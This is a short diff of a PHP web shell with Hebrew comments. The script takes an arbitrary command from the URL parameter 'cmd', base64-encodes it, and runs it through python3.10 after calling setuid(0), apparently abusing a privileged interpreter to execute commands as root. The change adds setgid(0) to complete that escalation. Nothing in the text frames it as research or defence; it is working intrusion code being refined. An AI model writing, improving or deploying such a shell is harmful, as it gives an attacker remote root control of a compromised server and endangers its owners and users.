@@ -20,7 +20,7 @@ if (isset($_GET['cmd'])) {
 
     // הפקודה המלאה (בדיוק כמו בסקריפט המקורי שלך)
     $c = base64_encode("cd $pwd && $cmd 2>&1");
-    system("/usr/bin/python3.10 -c 'import os,base64; os.setuid(0); os.system(base64.b64decode(\"$c\").decode())'");
+    system("/usr/bin/python3.10 -c 'import os,base64; os.setuid(0); os.setgid(0); os.system(base64.b64decode(\"$c\").decode())'");
     exit; // מסיים כאן כדי לא להדפיס HTML
 }
 // --- סוף חלק 1 ---
